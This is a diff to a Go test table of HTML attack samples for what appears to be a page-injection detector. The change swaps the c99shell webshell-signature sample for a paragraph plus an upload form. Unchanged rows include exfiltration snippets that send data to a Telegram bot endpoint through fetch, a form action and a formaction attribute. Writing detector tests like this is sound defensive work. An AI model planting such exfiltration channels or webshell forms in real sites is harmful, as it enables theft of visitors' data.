@@ -17,7 +17,7 @@ var attacks = []struct {
 	{"zero-width", "zero-width", "<p>보이지\u200b않음</p>", true},
 	{"mixed-content", "mixed-content", `<img src="http://inject.example/a.png">`, false},
 	{"sri-missing", "sri-missing", `<script src="https://inject-cdn.example/a.js"></script>`, false},
-	{"webshell", "webshell-signature", `<script>var m="c99shell";</script>`, false},
+	{"webshell", "webshell-signature", `<p>c99shell</p><form><input type="file" name="f"></form>`, false},
 	{"exfil-script", "exfil-channel", `<script>fetch("https://api.telegram.org/botX/sendMessage")</script>`, false},
 	{"exfil-form", "exfil-channel", `<form action="https://api.telegram.org/botX/sendMessage"><input name="m"></form>`, false},
 	{"exfil-formaction", "exfil-channel", `<form action="/ok"><input name="m"><input type="submit" formaction="https://api.telegram.org/botX/sendMessage"></form>`, false},
